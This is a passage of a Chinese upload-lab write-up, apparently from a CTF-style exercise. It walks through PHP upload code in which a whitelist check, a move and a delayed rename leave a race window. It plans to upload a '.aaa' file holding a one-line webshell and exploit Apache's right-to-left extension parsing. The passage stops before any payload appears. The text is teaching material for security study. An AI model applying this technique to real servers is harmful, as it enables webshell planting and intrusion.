&lt;h2 id=&#34;利用条件竞争漏洞（2）&#34;&gt;&lt;a href=&#34;#利用条件竞争漏洞（2）&#34; class=&#34;headerlink&#34; title=&#34;利用条件竞争漏洞（2）&#34;&gt;&lt;/a&gt;利用条件竞争漏洞（2）&lt;/h2&gt;&lt;p&gt;继续看源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//index.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./myupload.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$imgFileName&lt;/span&gt; =&lt;span class=&#34;title function_ invoke__&#34;&gt;time&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MyUpload&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$imgFileName&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$status_code&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;upload&lt;/span&gt;(UPLOAD_PATH);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$status_code&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;-&amp;gt;cls_upload_dir . &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;-&amp;gt;cls_file_rename_to;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件已经被上传，但没有重命名。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;这个文件不能上传到服务器的临时文件存储目录。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传失败，上传目录不可写。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传失败，无法上传该类型文件。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传失败，上传的文件过大。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传失败，服务器已经存在相同名称文件。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件无法上传，文件不能复制到目标目录。&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;未知错误！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//myupload.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;MyUpload&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cls_arr_ext_accepted&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;string&#34;&gt;&amp;quot;.doc&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.xls&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.pdf&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.gif&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.jpg&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.zip&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.rar&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.7z&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ppt&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.xml&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.tiff&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.jpeg&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt; , &lt;span class=&#34;string&#34;&gt;&amp;quot;.aaa&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/** upload()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   **&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   ** Method to upload the file.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   ** This is the only method to call outside the class.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   ** &lt;span class=&#34;doctag&#34;&gt;@para&lt;/span&gt; String name of directory we upload to&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;   ** &lt;span class=&#34;doctag&#34;&gt;@returns&lt;/span&gt; void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;  **/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt; &lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;isUploadedFile&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setDir&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkExtension&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkSize&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// if flag to check if the file exists is set to 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;cls_file_exists == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkFileExists&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// if we are here, we are ready to move the file to destination&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;move&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// check if we need to rename the file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;cls_rename_file == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;renameFile&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;variable&#34;&gt;$ret&lt;/span&gt; );    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// if we are here, everything worked as planned :)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;resultUpload&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;SUCCESS&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以分析整体也是分了三个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;checkExtension()&lt;/code&gt;检查白名单后缀&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move()&lt;/code&gt; 复制到永久目录中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;renamefile()&lt;/code&gt; 重命名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;也就是说，总有那么一种时刻，在检查完后缀、move之后，在重命名之前有个请求一直在访问上传的文件名，令Apache去解析它。&lt;/p&gt;
&lt;p&gt;这题和前面的题不一样的点在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;前一题可以直接上传php文件，因为它的流程里&lt;code&gt;move复制&lt;/code&gt;在前，&lt;code&gt;check白名单后缀&lt;/code&gt;在后。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;这个题不可以直接上传php文件，因为它的流程里&lt;code&gt;check白名单后缀&lt;/code&gt;在前，&lt;code&gt;move复制&lt;/code&gt;在后。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么，我们需要先上传可以上传的文件backdoor.aaa【包含一句话木马】。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cls_arr_ext_accepted&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;string&#34;&gt;&amp;quot;.doc&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.xls&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.pdf&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.gif&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.jpg&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.zip&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.rar&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.7z&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ppt&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.xml&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.tiff&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.jpeg&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;.aaa&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以上传backdoor.aaa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同时我们还知道Apache解析文件是对文件名的从后向前开始解析，如果在这个从后向前的过程中出现.php，那么就会将其解析成php文件&lt;/p&gt;
